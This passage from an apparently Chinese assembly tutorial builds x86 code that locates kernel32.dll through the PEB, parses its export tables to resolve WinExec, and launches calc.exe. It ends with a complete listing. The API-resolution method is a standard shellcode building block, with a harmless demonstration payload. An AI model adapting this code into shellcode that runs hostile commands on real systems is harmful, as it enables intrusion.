&lt;p>这份文档曾经是错误的，&lt;a class="link" href="https://stackoverflow.com/questions/39996742/how-can-kernel32-dll-export-an-ordinal-of-0-when-its-ordinalbase-field-is-s" target="_blank" rel="noopener"
>见爆栈的这个问题&lt;/a>。要是看了什么不知道从哪儿复制粘贴来的博客可能会有误解，但现在的文档里是明确说了是 &lt;strong>unbiased indexes&lt;/strong> 。取得 Ordinal 之后直接当下标去访问就行了。&lt;/p>
&lt;blockquote>
&lt;p>The export ordinal table is an array of &lt;strong>16-bit unbiased indexes&lt;/strong> into the export address table. Ordinals are biased by the Ordinal Base field of the export directory table. In other words, the ordinal base must be subtracted from the ordinals to obtain true indexes into the export address table.&lt;/p>
&lt;/blockquote>
&lt;p>文档也明确指出，你可以把名称表和ordinal表当成一个表，下标是共通的。也就是名称表的第1个元素对应ordinal表的第一个元素，以此类推。&lt;/p>
&lt;blockquote>
&lt;p>The export name pointer table and the export ordinal table form two parallel arrays that are separated to allow natural field alignment. These two tables, in effect, operate as one table, in which the Export Name Pointer column points to a public (exported) name and the Export Ordinal column gives the corresponding ordinal for that public name. A member of the export name pointer table and a member of the export ordinal table are associated by having the same position (index) in their respective arrays.&lt;/p>
&lt;/blockquote>
&lt;p>现在我们可以开始处理这几个表了。&lt;/p>
&lt;h3 id="25-遍历名称表">2.5 遍历名称表&lt;/h3>
&lt;p>字符串常量要记得先定义好，之后用。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">section&lt;/span> &lt;span class="no">.data&lt;/span>
&lt;span class="nl">str_winexec:&lt;/span>
&lt;span class="nf">db&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="no">WinExec&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="nl">str_calcexe:&lt;/span>
&lt;span class="nf">db&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="no">calc.exe&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>首先从名称表里找出 &lt;code>WinExec&lt;/code> 这个字符串。之后会拿 &lt;code>eax&lt;/code> 保存下标，&lt;code>ecx&lt;/code> 用于 &lt;code>repe cmpsb&lt;/code> 指令，所以这两个字段我们先清空。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm"> &lt;span class="nf">xor&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="nf">xor&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ecx&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>接着写一个循环。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nl">.findWinExecLocation:&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">esi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">str_winexec&lt;/span> &lt;span class="c">; 准备比较，esi=常量字符串
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">edi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-address_of_name_table&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; 准备比较，edi=名称表首元素，注意名称表是一个指针数组，每个元素都是 DWORD RVA
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">cld&lt;/span> &lt;span class="c">; 清除 df 标志位
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 暂存下 eax，接下来 eax 要算下标
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">shl&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="no">h&lt;/span> &lt;span class="c">; 左移 2 位，等于 eax *= 4
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">add&lt;/span> &lt;span class="no">edi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 啰嗦这么多就是为了 edi = edi + eax * 4
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ecx&lt;/span> &lt;span class="c">; 恢复 eax 的值
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="no">mov&lt;/span> &lt;span class="no">edi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebx&lt;/span> &lt;span class="err">+&lt;/span> &lt;span class="no">edi&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; edi = *(基址+名称表RVA[下标])，注意此时拿到的还是一个 RVA ，指向导出函数名字符串
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">add&lt;/span> &lt;span class="no">edi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ebx&lt;/span> &lt;span class="c">; 将 RVA 加上基址，得到完整的地址
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">cx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span> &lt;span class="c">; repe cmpsb 使用 cx 寄存器来计数，WinExec 长度是 7，加上 NUL 就是 8 个字符
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">repe&lt;/span> &lt;span class="no">cmpsb&lt;/span> &lt;span class="c">; 字符串比较
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="no">jz&lt;/span> &lt;span class="no">.found&lt;/span> &lt;span class="c">; 如果 repe cmpsb 得到的结果是相同，那么当前下标 eax 就是 WinExec 了，跳转出循环
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">inc&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 否则下标自增
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">cmp&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-numberof_export_entries&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; 如果当前下标还不等于导出总数
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">jne&lt;/span> &lt;span class="no">.findWinExecLocation&lt;/span> &lt;span class="c">; 继续循环
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="no">.found&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>最复杂的部分就是算偏移，在 C 中一个下标运算又或者指针解引用的事情在汇编里就很蛋疼。&lt;/p>
&lt;h3 id="26-取-ordinal-和函数地址">2.6 取 Ordinal 和函数地址&lt;/h3>
&lt;p>得到正确下标后就可以取 Ordinal 了。先把 ordinal 表的地址和 函数地址表的地址放进寄存器。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm"> &lt;span class="nf">mov&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-address_of_ordinal_table&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">edx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-address_of_func_address_table&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后用 eax 做下标，取 ordinal 值。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm"> &lt;span class="nf">mov&lt;/span> &lt;span class="no">ax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ecx&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="p">*&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; ax(ordinal) = ((WORD*)ordinal_table)[eax]
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>再拿 Ordinal 值做下标，取函数地址。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm"> &lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,[&lt;/span>&lt;span class="no">edx&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="p">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = ((DWORD*)address_table)[eax]
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后把函数地址（RVA）加上基址。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm"> &lt;span class="nf">add&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ebx&lt;/span> &lt;span class="c">; eax=WinExec 函数的地址
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>得到 &lt;code>WinExec&lt;/code> 函数在内存中的地址。&lt;/p>
&lt;h3 id="27-调用-winexec-函数">2.7 调用 WinExec 函数&lt;/h3>
&lt;p>Windows API 都是 &lt;em>stdcall&lt;/em> 调用约定，我们不用管清栈，直接压参数就好。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm"> &lt;span class="nf">push&lt;/span> &lt;span class="mi">10&lt;/span> &lt;span class="c">; SW_SHOWDEFAULT
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">push&lt;/span> &lt;span class="no">str_calcexe&lt;/span> &lt;span class="c">; 字符串 calc.exe
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">call&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; __stdcall WinExec
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>到这里，应该就成功调用了 &lt;code>WinExec&lt;/code> 函数了。&lt;/p>
&lt;h3 id="28-清理和退出">2.8 清理和退出&lt;/h3>
&lt;p>写完了主要功能，接下来就要给自己擦屁股了，平栈。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm"> &lt;span class="nf">add&lt;/span> &lt;span class="no">esp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="no">ch&lt;/span>
&lt;span class="nf">pop&lt;/span> &lt;span class="no">ebp&lt;/span>
&lt;span class="nf">xor&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="nf">retn&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>收工！&lt;/p>
&lt;h3 id="29-完整代码">2.9 完整代码&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">kernel32_base&lt;/span> &lt;span class="mi">0x04&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">numberof_export_entries&lt;/span> &lt;span class="mi">0x08&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">address_of_ordinal_table&lt;/span> &lt;span class="mi">0x0c&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">address_of_func_address_table&lt;/span> &lt;span class="mi">0x10&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">address_of_export_directory_table&lt;/span> &lt;span class="mi">0x14&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">address_of_name_table&lt;/span> &lt;span class="mi">0x18&lt;/span>
&lt;span class="err">%&lt;/span>&lt;span class="nf">define&lt;/span> &lt;span class="no">ordinal_base&lt;/span> &lt;span class="mi">0x1c&lt;/span>
&lt;span class="nf">section&lt;/span> &lt;span class="no">.text&lt;/span>
&lt;span class="nf">global&lt;/span> &lt;span class="no">_main&lt;/span>
&lt;span class="nl">_main:&lt;/span>
&lt;span class="nf">push&lt;/span> &lt;span class="no">ebp&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">ebp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">esp&lt;/span>
&lt;span class="nf">sub&lt;/span> &lt;span class="no">esp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="no">ch&lt;/span>
&lt;span class="c">; 获取 kernel32.dll 基址
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">fs&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">30&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = TEB-&amp;gt;PEB
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="no">ch&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = PEB-&amp;gt;Ldr
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = PEB_LDR_DATA-&amp;gt;InMemoryOrderModuleList.Flink (当前程序)
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = &amp;amp;_LDR_DATA_TABLE_ENTRY.InMemoryOrderModuleList.Flink (现在是 ntdll.dll)
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = &amp;amp;_LDR_DATA_TABLE_ENTRY.InMemoryOrderModuleList.Flink (现在是 kernel32.dll)
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax-8h&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = &amp;amp;_LDR_DATA_TABLE_ENTRY.DllBase (kernel32.dll 基址)
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">ebx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; ebx -&amp;gt; kernel32.dll 基址
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-kernel32_base&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; kernel32_base -&amp;gt; kernel32.dll 基址
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebx&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="no">ch&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">add&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ebx&lt;/span> &lt;span class="c">; eax -&amp;gt; kernel32.dll 的 pe 文件头
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">78&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax -&amp;gt; ExportDirectory.VirtualAddress
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">add&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ebx&lt;/span> &lt;span class="c">; eax -&amp;gt; Export Directory Table
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 暂存导出表结构基址用来运算
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-address_of_export_directory_table&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 保存导出表结构基址到栈变量
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="no">ch&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">add&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ebx&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-address_of_func_address_table&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 保存导出函数表地址到栈变量
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ecx&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">add&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ebx&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-address_of_ordinal_table&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 保存ordinal表地址到栈变量
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ecx&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-numberof_export_entries&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 保存导出表(name)数量到栈变量
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ecx&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax=第一个函数名称的 RVA
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-address_of_name_table&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 保存导出函数的名称表到栈变量
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ecx&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-ordinal_base&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 保存 ordinal base 用于计算导出函数的地址
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nf">xor&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="no">eax&lt;/span>
&lt;span class="nf">xor&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="no">ecx&lt;/span>
&lt;span class="nl">.findWinExecLocation:&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">esi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">str_winexec&lt;/span> &lt;span class="c">; 准备比较，esi=常量字符串
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">edi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-address_of_name_table&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; 准备比较，edi=名称表首元素
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">cld&lt;/span> &lt;span class="c">; 清除 df 标志位
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 暂存下 eax，接下来 eax 要算下标
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">shl&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="no">h&lt;/span> &lt;span class="c">; 左移 2 位，等于 eax *= 4
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">add&lt;/span> &lt;span class="no">edi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 啰嗦这么多就是为了 edi = edi + eax * 4
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ecx&lt;/span> &lt;span class="c">; 恢复 eax 的值
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">edi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebx&lt;/span> &lt;span class="err">+&lt;/span> &lt;span class="no">edi&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; edi = *(基址+名称表RVA[下标])，注意此时拿到的还是一个 RVA ，指向导出函数名字符串
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">add&lt;/span> &lt;span class="no">edi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ebx&lt;/span> &lt;span class="c">; 将 RVA 加上基址，得到完整的地址
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">cx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span> &lt;span class="c">; repe cmpsb 使用 cx 寄存器来计数，WinExec 长度是 7，加上 NUL 就是 8 个字符
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">repe&lt;/span> &lt;span class="no">cmpsb&lt;/span> &lt;span class="c">; 字符串比较
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nf">jz&lt;/span> &lt;span class="no">.found&lt;/span> &lt;span class="c">; 如果 repe cmpsb 得到的结果是相同，那么当前下标 eax 就是 WinExec 了，跳转出循环
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">inc&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 否则下标自增
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">cmp&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-numberof_export_entries&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; 如果当前下标还不等于导出总数
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">jne&lt;/span> &lt;span class="no">.findWinExecLocation&lt;/span> &lt;span class="c">; 继续循环
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nl">.found:&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-address_of_ordinal_table&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">edx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-address_of_func_address_table&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">ax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ecx&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="p">*&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; ax(ordinal) = ((WORD*)ordinal_table)[eax]
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,[&lt;/span>&lt;span class="no">edx&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="p">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; eax = ((DWORD*)address_table)[eax]
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">add&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ebx&lt;/span> &lt;span class="c">; eax=WinExec 函数的地址
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nf">push&lt;/span> &lt;span class="mi">10&lt;/span> &lt;span class="c">; SW_SHOWDEFAULT
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">push&lt;/span> &lt;span class="no">str_calcexe&lt;/span> &lt;span class="c">; 字符串 calc.exe
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">call&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; __stdcall WinExec
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nf">add&lt;/span> &lt;span class="no">esp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="no">ch&lt;/span>
&lt;span class="nf">pop&lt;/span> &lt;span class="no">ebp&lt;/span>
&lt;span class="nf">xor&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="nf">retn&lt;/span>
&lt;span class="nf">section&lt;/span> &lt;span class="no">.data&lt;/span>
&lt;span class="nl">str_winexec:&lt;/span>
&lt;span class="nf">db&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="no">WinExec&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="nl">str_calcexe:&lt;/span>
&lt;span class="nf">db&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="no">calc.exe&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="0x03-验证">0x03 验证&lt;/h2>
